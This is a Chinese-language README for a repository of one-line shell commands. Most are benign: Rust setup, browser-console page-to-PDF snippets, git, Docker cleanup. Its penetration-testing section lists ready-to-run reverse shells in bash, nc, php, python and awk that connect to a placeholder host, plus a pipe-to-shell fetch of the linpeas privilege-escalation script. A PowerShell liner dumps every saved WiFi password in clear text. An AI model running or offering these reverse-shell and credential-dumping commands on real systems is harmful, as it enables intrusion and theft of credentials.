# Oneliner
---
这是一个 包含了 只需要一行 instruction sequence 即可完成目标的 仓库.

将每一条记录称为 liner

这个仓库 涵盖了很多方面 如下载 安装 POC验证 EXP利用 等.

仓库遵循 content first 原则.

由于项目的特殊性, 参加项目请使用issue 来提供您的 liner

格式要求
````
## category <!-- 分类, 也是liner的 头部 --> <!-- 由管理员 识别并合并 -->
### title
> ***<date YY-mm-dd>: <author|mail>***
[> **<description>**] <!-- 描述信息 -->
```lang <!-- 该部分可有多个 -->
instruction
```
--- <!-- 当前liner的 分割线 也是尾部 -->
````
## 目录
* [Rust](#rust)
  * [Linux安装Rust环境](#linux安装rust环境)
* [渗透测试](#渗透测试)
  * [Linpeas.sh枚举提权信息](#linpeassh枚举提权信息)
  * [反弹shell合集](#反弹shell合集)
* [xxx2pdf](#xxx2pdf)
  * [freebuf2pdf](#freebuf2pdf)
  * [csdn2pdf](#csdn2pdf)
  * [wechat2pdf](#wechat2pdf)
* [WIFI](#wifi)
  * [powershell获取密码](#powershell获取密码)

<!-- 列表头 -->
## Rust
### Linux安装Rust环境
> ***2024-6-25: fb0sh***
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```
> **(中国区环境)**
```bash
export RUSTUP_DIST_SERVER="https://rsproxy.cn";export RUSTUP_UPDATE_ROOT="https://rsproxy.cn/rustup";curl --proto '=https' --tlsv1.2 -sSf https://rsproxy.cn/rustup-init.sh | sh
```
---


## 渗透测试
### Linpeas.sh枚举提权信息
> ***2024-6-25: fb0sh***
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
> **python2**
```bash
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
```
> **python3**
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
```
--- 

### 反弹shell合集
> ***2024-6-25: fb0sh***

> **bash**
```bash
/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```
> **nc**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```
```bash
nc 10.10.10.10 9001 -e /bin/bash
```
> **php**
```php
php -r '$sock=fsockopen("10.10.10.10",9001);popen("/bin/bash <&3 >&3 2>&3", "r");'
```
> **python**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
```python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
> **awk**
```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
--- 

### xxx2pdf
> 打开浏览器控制台后粘贴js代码
### freebuf2pdf
> ***2024-6-28: fb0sh***
```js
["articles-layout-header ant-layout-header", "page-header", "ant-layout-footer","floating-view", "aside-left", "aside-right", "remix-module","introduce"].forEach(c => document.getElementsByClassName(c)[0].remove());document.getElementsByClassName("main")[0].setAttribute("style","width:100%");window.print();
```
---
### csdn2pdf
> ***2024-6-28: fb0sh***
```js
["toolbarBox", "rightAside", "pcCommentBox", "recommendNps", "toolBarBox"].forEach(i => document.getElementById(i).remove());["blog_container_aside", "recommend-box", "blog-footer-bottom", "csdn-side-toolbar"].forEach(c => document.getElementsByClassName(c)[0].remove());document.querySelectorAll("main")[0].setAttribute("style","width:95");window.print();
```
---
### wechat2pdf
> ***2024-6-28: fb0sh***

> **也可直接使用edge快捷键Ctrl+P**
```js
window.print();
```
---
## WIFI
### powershell获取密码
> ***2024-7-1: fb0sh***

> 请放入powershell里
```powershell
$language=(Get-Culture).Name;if($language -eq "zh-CN"){$profileRegex="\s所有用户配置文件\s*:\s*(.*)$";$keyContentRegex="关键内容\s*:\s*(.*)$"}else{$profileRegex="\sAll User Profile\s*:\s*(.*)$";$keyContentRegex="Key Content\s*:\s*(.*)$"};$results=@();$profiles=netsh wlan show profiles|Select-String $profileRegex|ForEach-Object {$_.Matches[0].Groups[1].Value.Trim()};foreach($profile in $profiles){$profileInfo=netsh wlan show profile name="$profile" key=clear;$passwordMatch=$profileInfo|Select-String $keyContentRegex;$password=if($passwordMatch){$passwordMatch.Matches[0].Groups[1].Value.Trim()}else{"No Password Found"};$results+=[PSCustomObject]@{SSID=$profile;Password=$password}};$results|Format-Table -AutoSize
```
## GIT
### winget安装git
> ***2024-7-4: fb0sh***
```powershell
winget install --id Git.Git -e --source winget
```
---

## Python 小段代码
### python 0 填充
> ***2024-7-17: fb0sh***
```python
res=[f"{i:03}" for i in range(100)]
```
---
### windows重启进入BIOS(仅适用UEFI启动)
> ***2024-7-17: fb0sh***
```cmd
shutdown.exe /r /fw /t 1
```
---
## Docker
### Docker 删除所有镜像
> ***2024-7-20: fb0sh***
```bash
docker rmi $(docker images | sed -n '2,14p' | awk '{print $3}' | tr -s "\n" " ")
```
---
### Docker 删除所有容器
> ***2024-7-20: fb0sh***
```bash
docker rm $(docker ps -a | sed -n '2,14p' | awk '{print $1}' | tr -s "\n" " ")
```
---
<!-- 列表尾 -->
